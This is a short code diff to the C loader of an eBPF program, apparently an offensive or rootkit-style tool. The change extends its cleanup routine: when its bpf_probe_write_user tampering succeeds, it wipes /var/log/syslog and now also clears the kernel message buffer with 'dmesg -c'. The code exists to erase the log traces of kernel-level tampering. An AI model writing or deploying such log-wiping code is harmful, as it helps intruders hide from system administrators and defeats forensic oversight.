@@ -11,6 +11,8 @@
 #include <bpf/libbpf.h>
 #include <sys/resource.h>
 #include <sys/mman.h>
+#include <sys/klog.h>
+#include <syslog.h>
 
 static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
 {
@@ -71,10 +73,11 @@ static bool setup()
 static int handle_event(void *ctx, void *data, size_t data_sz)
 {
     const struct event *e = data;
-    /* nuke the syslog if we used bpf_probe_write_user to modify msg */
+    /* nuke syslog and dmesg if we used bpf_probe_write_user to modify msg */
     if (e->success) {
-        fprintf(stderr, "Cleaning up syslog\n");
+        fprintf(stderr, "Cleaning up syslog + dmesg\n");
         system("> /var/log/syslog"); 
+        system("dmesg -c"); 
     }
 
     return 0;
